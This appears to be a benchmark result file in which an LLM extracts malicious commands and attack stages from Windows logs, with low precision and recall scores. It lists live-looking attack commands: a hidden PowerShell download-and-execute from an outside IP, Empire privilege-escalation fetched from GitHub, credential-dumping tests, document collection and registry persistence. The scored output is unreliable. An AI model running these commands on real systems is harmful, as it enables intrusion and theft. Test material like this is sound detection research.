@@ -1,0 +1,150 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "{\"name\":\"pathToBinary\",\"args\":[],\"debug\":{\"showWindow\":true,\"attach\":false}",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \\\"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \\\" /v \\\"verifierdlls \\\" /d \\\"1 \\\" /f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg delete \\\"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options \\\" /v verifierdlls /f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \\\"HKCU\\Environment\\\" /v \\\"windir\\\" /d \\",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "netstat -an ",
+        "stage": "Collection"
+      },
+      {
+        "command": "arp -a",
+        "stage": "Collection"
+      },
+      {
+        "command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1 & dir c: /b /s .docx | findstr /e .docx & for /R c: %f in (*.docx) do copy %f %temp%\\T1119_command_prompt_collection",
+        "stage": "Collection"
+      },
+      {
+        "command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1 & dir c: /b /s .docx | findstr /e .docx & for /R c: %f in (*.docx) do copy %f %temp%\\T1119_command_prompt_collection",
+        "stage": "Collection"
+      },
+      {
+        "command": "sc query type=service > %TEMP%\\T1119_1.txt & doskey /history > %TEMP%\\T1119_2.txt & wmic process list > %TEMP%\\T1119_3.txt & tree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt",
+        "stage": "Collection"
+      },
+      {
+        "command": "REG ADD \\\"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\" /V \\\"Atomic Red Team\\\" /t REG_SZ /F /D \\\"C:\\Path\\AtomicRedTeam.exe\\\"",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The malicious actor has been using various PowerShell scripts to execute code remotely, attempt privilege escalation, and collect information about the target environment. The actor has also created files and registry keys as persistence mechanisms. Additionally, they have made attempts to disable System integrity checks via the Image File Execution Options (IFE) registry key.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58734,
+      "completion_tokens": 1329,
+      "total_tokens": 60063,
+      "wall_clock_s": 31.106,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.12,
+      "recall": 0.2,
+      "f1": 0.15,
+      "tp": 3,
+      "fp": 22,
+      "fn": 12
+    },
+    "stage": {
+      "precision": 0.04,
+      "recall": 0.07142857142857142,
+      "f1": 0.05128205128205128,
+      "tp": 1,
+      "fp": 24,
+      "fn": 13,
+      "recall_partial": 0.10714285714285714
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 58734,
+      "completion_tokens": 1329,
+      "total_tokens": 60063,
+      "wall_clock_s": 31.106,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
